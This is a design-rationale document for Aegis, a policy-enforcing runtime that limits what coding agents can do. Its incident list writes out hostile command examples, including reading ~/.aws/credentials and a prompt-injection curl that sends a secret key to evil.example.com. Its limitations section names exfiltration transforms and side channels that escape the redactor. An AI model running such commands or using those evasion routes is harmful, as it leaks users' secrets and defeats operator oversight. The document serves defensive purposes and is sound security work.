# Why Aegis

> ← [Back to docs README](README.md)

## The problem

Coding agents — Claude Code, Cursor, opencode, Aider, custom CLI bots — all
sit somewhere on a spectrum between **"approve every command"** (friction-
heavy, fatigue-prone, the user clicks through anyway) and **"YOLO mode"**
(no safety, every shell call runs). Both modes share a critical property:
the **agent runtime decides what's safe**, based on what the model emitted,
and the model can phrase commands to look more innocuous than they are.

This is not an authorization system. It's prompt-and-pray.

The kinds of incidents we want to prevent:

- An agent that needs to run `git rebase` issues `git push --force-with-lease`,
  rewriting a shared branch.
- An agent reading the project's source autonomously decides to "look up
  context" via `cat ~/.aws/credentials` to debug a deployment script.
- A subtly misaligned task ends up running `rm -rf` on a directory the user
  expected to be read-only.
- A prompt-injection vector in a fetched README causes the agent to call
  `curl http://evil.example.com/$AWS_SECRET_ACCESS_KEY` and exfiltrate the
  key — a real, documented attack class.
- A cloud-orchestrated agent, given access to the user's API keys to call a
  remote service, includes them in its summary string and they end up in the
  orchestrator's context window or chat transcript.

Each of these is a **system-level authorization failure**. None of them
should be solved by asking the model nicely or hoping it doesn't choose to
do the bad thing.

## The Aegis approach: safe by design

Aegis is built as a **safe-by-design local tooling layer for agentic
AI**. The whole point of the runtime is that the operator decides
what an agent can do — through a policy file — and the runtime enforces
that decision structurally, not advisorily. There is no "soft-warn"
mode, no "best-effort", no fallback that quietly runs the action
anyway. What's not in the policy doesn't happen.

Concretely, that means a **declarative policy file** at the runtime
layer. The policy is text, version-controllable, reviewable in PRs.
The runtime reads it at startup, and forbidden operations fail at the
system layer — before execution, during execution, or both. The model
literally cannot construct code that bypasses the policy by clever
phrasing, because the rejection happens in Rust, not in a wrapper that
asks the model nicely. And the policy file itself is protected: at
load time Aegis refuses any policy whose `write_allow` or
`delete_allow` matches the policy file — an agent that can rewrite the
policy that controls it has nullified every other rule.

Concretely, an Aegis-enforced agent run looks like this:

1. Operator (or developer, or CI) writes a policy: `aegis.toml`.
2. The agent host (Claude Code, opencode, custom orchestrator, ...) hands a
   piece of code to Aegis, either by spawning the `aegis` CLI or by calling
   `aegis-mcp` over MCP.
3. Aegis pre-scans the code, rejects any reference to a capability the
   policy forbids (the **verifier**).
4. Aegis evaluates the code in an embedded Starlark interpreter — Python's
   safe subset. Every effecting call (`fs.read`, `net.http_get`,
   `subprocess.exec`, `env.read`) goes through a typed builtin that
   re-checks the policy at call time and emits an **audit event**.
5. The script's printed output, audit log, and tool-result text are
   scrubbed of any tainted values (see [04-policy-file.md](04-policy-file.md)
   on local-only reads).

Three lines of defense, all in the runtime: pre-execution verifier, runtime
capability gate, and output-boundary redaction. None depends on prompting.

## What Aegis is NOT

- **Not a sandbox in the OS sense.** Aegis enforces a policy at the
  language-runtime layer; it does not isolate processes with seccomp,
  namespaces, or VMs. If you need OS-level isolation, run Aegis inside a
  container or jail.
- **Not a replacement for code review.** A policy file is a contract about
  what the agent *can do*; reviewing the actual scripts the agent emits
  remains the user's responsibility.
- **Not perfect against deliberate exfiltration.** The local-only
  enforcement covers a documented set of practical transforms
  (byte-reverse, hex lower/upper, XOR with each single-byte key,
  hex(XOR) compositions, per-character chunking) and refuses
  outbound effects that would carry tainted bytes to a non-local-
  only sink — but a transform with a script-generated key (AES,
  RC4, custom invertible permutation) escapes, since the redactor
  doesn't know the key. Pure side channels (length, comparison
  oracles, substring guesses) also remain. See
  [security-threat-model.md](security-threat-model.md) for the
  empirical exfil-probe results and the precise scope. The
  threat model the runtime closes is *prompt engineering* — a
  malicious prompt cannot bypass the policy because the policy
  is enforced in Rust, not by the model.

## Threat model

| Threat                                        | Defense                              |
|-----------------------------------------------|---------------------------------------|
| Agent autonomously reads sensitive files       | `[filesystem].deny`, default-deny on `read_allow` |
| Agent runs destructive shell commands          | `[subprocess].allow_commands` allowlist + `deny_args` per-command |
| Agent fetches from prod / cloud-metadata IPs   | `[network].deny_ips` (CIDR), DNS resolution checked |
| Agent leaks API keys to the cloud orchestrator | `[environment].local_only_vars`, output redaction |
| Prompt injection sends commands as text         | Verifier rejects forbidden capability names before eval |
| Agent runtime mis-renders an "approval" prompt  | Confirm hook is part of the runtime, not the model |
| Agent uses git destructively                    | `[subprocess.deny_args] git = ["push --force", ...]` |
| Agent deploys to staging / prod                 | Default policy denies `kubectl`, `terraform`, `aws`, ... |

## Where this lives in the project

- [02-from-sigil.md](02-from-sigil.md) — the design history: what the earlier
  Sigil project tried, what didn't work, and what changed.
- [03-architecture.md](03-architecture.md) — the actual implementation: how
  Starlark, capability typing, and the three lines of defense fit together.
- [04-policy-file.md](04-policy-file.md) — how to write policies. The most
  important read after this one.
